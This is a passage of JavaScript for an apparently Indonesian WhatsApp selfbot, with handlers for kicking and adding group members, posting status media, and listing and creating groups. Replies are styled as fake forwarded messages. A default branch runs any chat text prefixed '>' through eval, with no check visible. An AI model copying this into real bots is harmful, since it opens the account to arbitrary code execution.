            ichi.sendFakeToko(from, ' ``ANDA TELAH OFFLINE``` ', 'OFFLINE')
             break   
			case 'kick':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}kick @tag atau nomor`, ich)
				if (ich.message.extendedTextMessage != undefined){
                    mentioned = ich.message.extendedTextMessage.contextInfo.mentionedJid
					await ichi.FakeTokoForwarded(from, `Bye...`, fake)
					ichi.kick(from, mentioned)
				} else {
					await ichi.FakeTokoForwarded(from, `Bye...`, fake)
					ichi.kick(from, [args[0] + '@s.whatsapp.net'])
				}
				break
			case 'add':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}kick 628xxxx`, ich)
				ichi.add(from, [args[0] + '@s.whatsapp.net'])
				ichi.FakeTokoForwarded(from, `Sukses`, fake)
				break
				case 'upswimage':
				q = arg
					ichh.updatePresence(from, Presence.composing)
					if (isQuotedImage) {
						const swsw = isQuotedImage ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						cihcih = await ichh.downloadMediaMessage(swsw)
						ichh.sendMessage('status@broadcast', cihcih, MessageType.image, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Image dengan Caption: ${q}`
					ichi.sendFakeToko(from, bur, 'Story Image')
					break
				case 'upswvideo':
				q = body.slice(11)
					ichh.updatePresence(from, Presence.composing)
					if (isQuotedVideo) {
						const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						cihcih = await ichh.downloadMediaMessage(swsw)
						ichh.sendMessage('status@broadcast', cihcih, MessageType.video, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Video dengan Caption: ${q}`
					ichi.sendFakeToko(from, bur, 'Story Video')
					break
			case 'upstatus':
				if (!arg) return ichi.reply(from, `Penggunaan \n${prefix}upstatus text\n${prefix}upstatus caption <reply atau kirim video / img>`, ich)
				if (isMedia && !ich.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ich
					const media = await ichh.downloadAndSaveMediaMessage(encmedia)
					ichi.upImgStatus(media, arg).then(() => { ichi.FakeTokoForwarded(from, 'Sukses', fake) })
				} else if ((isMedia || isQuotedVideo )) {
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ich
					const media = await ichh.downloadAndSaveMediaMessage(encmedia)
					ichi.upVidStatus(media, arg).then(() => { ichi.FakeTokoForwarded(from, 'Sukses', fake) })
				} else {
					await ichi.upTextStatus(arg).then(() => { ichi.FakeTokoForwarded(from, 'Sukses', fake) })
				}
				break
			case 'getgrup': case 'getgroup': case 'getg':
				const ingfo = await ichi.getGroup(totalchat)
				let txt = `Ingfo grup\nJumlah Grup: ${ingfo.length}\n\n`
				for (let i = 0; i < ingfo.length; i++){
					txt += `Nama grup : ${ingfo[i].subject}\nID grup : ${ingfo[i].id}\nDibuat : ${moment(`${ingfo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\nJumlah Peserta : ${ingfo[i].participants.length}\n\n`
				}
				ichi.FakeTokoForwarded(from, txt, fake)
				break
			case 'creategrup': case 'creategroup': case 'createg':
				argz = arg.includes('|')
				if (ich.message.extendedTextMessage != undefined){
                    mentioned = ich.message.extendedTextMessage.contextInfo.mentionedJid
					let anji = await ichi.createGroup(argz[0], mentioned)
					ichi.FakeTokoForwarded(from, JSON.stringify(anji), fake)
				} else {
					ichi.reply(from, `Penggunaan ${prefix}creategrup namagrup|@tag`, ich)
				}
				break
			case 'imgtourl': case 'tourl':
				const encmediiia = isQuotedImage ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ich
				const mediaq = await ichh.downloadAndSaveMediaMessage(encmediiia)
				const upli = await uptotele(mediaq)
				ichi.reply(from, `${upli}`, ich)
				fs.unlinkSync(mediaq)
				break
			default:
				if (chats.startsWith('>')){
					console.log(color('[EVAL]'), color(moment(ich.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval brooo`))
                	return ichi.reply(from, JSON.stringify(eval(chats.slice(2)), null, 2), ich)
				}
				break
        }
    } catch (err) {
        console.log(color('[ERROR]', 'red'), err)
    }
})
